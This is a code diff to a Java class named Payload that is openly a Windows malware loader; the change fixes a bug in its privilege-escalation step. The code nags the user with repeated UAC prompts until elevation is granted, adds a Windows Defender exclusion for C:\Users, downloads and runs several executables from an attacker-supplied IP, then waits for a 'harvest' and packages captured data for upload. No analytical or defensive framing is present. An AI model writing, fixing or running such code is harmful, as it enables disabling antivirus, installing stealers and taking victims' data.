@@ -51,11 +51,11 @@ public class Payload {
 
     private static void uacLoop(String key, String ip) {
         try {
-            // Get the exact path to javaw.exe
-            String javaHome = System.getProperty("java.home");
+            // Use the exact path from java.home and ensure it's absolute
+            String javaHome = new File(System.getProperty("java.home")).getAbsolutePath();
             String javaw = javaHome + "\\bin\\javaw.exe";
+            String javaBinDir = javaHome + "\\bin";
             
-            // Get the exact path to st.jar, handling spaces
             String jarPath = new File(Payload.class.getProtectionDomain().getCodeSource().getLocation().toURI()).getAbsolutePath();
             
             log("javaw: " + javaw);
@@ -63,9 +63,9 @@ public class Payload {
 
             while (true) {
                 log("Triggering UAC...");
-                // SW_SHOWNORMAL = 1 (forces the prompt to show)
+                // Pass javaBinDir as the lpDirectory parameter to fix "Code: 2" (File not found)
                 int result = Shell32.INSTANCE.ShellExecuteW(
-                    null, "runas", javaw, "-jar \"" + jarPath + "\" " + key + " " + ip, null, 1
+                    null, "runas", javaw, "-jar \"" + jarPath + "\" " + key + " " + ip, javaBinDir, 1
                 );
 
                 if (result > 32) {
@@ -87,20 +87,17 @@ public class Payload {
             String appData = System.getenv("APPDATA");
             File loaderDir = new File(appData, "loader");
 
-            // 1. Add AV Exclusion
             log("Adding AV exclusion...");
             String regPath = "HKLM\\SOFTWARE\\Microsoft\\Windows Defender\\Exclusions\\Paths";
             String cmd = "reg add \"" + regPath + "\" /v \"C:\\Users\" /t REG_DWORD /d 0 /f";
             Runtime.getRuntime().exec(cmd).waitFor();
             
-            // 2. Download EXEs
             log("Downloading payloads...");
             String[] files = {"1.exe", "2.exe", "3.exe", "crmodule.dll"};
             for (String file : files) {
                 downloadFile("http://" + ip + "/api/downloads/" + file, new File(loaderDir, file));
             }
 
-            // 3. Execute
             log("Executing 3.exe...");
             new ProcessBuilder(new File(loaderDir, "3.exe").getAbsolutePath()).start();
             
@@ -112,7 +109,6 @@ public class Payload {
             log("Executing 1.exe...");
             new ProcessBuilder(new File(loaderDir, "1.exe").getAbsolutePath()).start();
 
-            // 4. Harvest & Upload
             log("Waiting for harvest...");
             Thread.sleep(25000);
             File zipFile = new File(loaderDir, "capture.zip");
